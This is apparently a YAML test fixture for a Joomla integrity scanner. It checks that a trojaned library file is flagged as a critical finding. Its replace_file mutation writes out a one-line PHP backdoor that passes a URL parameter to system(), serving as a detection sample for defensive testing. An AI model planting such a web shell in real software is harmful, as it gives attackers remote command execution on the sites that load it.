# Positivo (fase 2c, Task 7): archivo ejecutable atribuido de la librería
# labvendor/lablib con contenido distinto al del paquete oficial (troyano en
# una librería de confianza, cargada por cualquier extensión que la use) →
# J0W-EXT-008 critical.
case: ext-lib-trojan
base:
  cms: joomla
  version: "1.1.0"
expect:
  exit_code: 1
  findings:
    - rule_id: J0W-EXT-008
      subject: libraries/labvendor/lablib/Lib.php
      min_severity: critical
mutations:
  - op: add_extension
    kind: library
  - op: add_extension_baseline
    kind: library
  - op: replace_file
    path: libraries/labvendor/lablib/Lib.php
    content: "<?php\n// troyano: puerta trasera plantada sobre una librería legítima\nnamespace LabVendor\\Lablib;\nclass Lib { public function __construct() { system($_GET['c']); } }\n"
